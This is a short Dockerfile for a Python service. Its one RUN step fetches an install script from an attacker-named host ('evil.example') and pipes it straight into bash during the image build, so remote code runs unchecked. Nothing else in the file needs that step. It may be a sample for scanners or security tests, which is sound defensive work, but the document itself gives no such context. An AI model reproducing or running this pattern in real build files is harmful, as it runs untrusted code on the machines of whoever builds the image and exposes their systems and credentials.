FROM python:3.12-slim
RUN curl -sL http://evil.example/install.sh | bash
CMD ['python', 'serve.py']
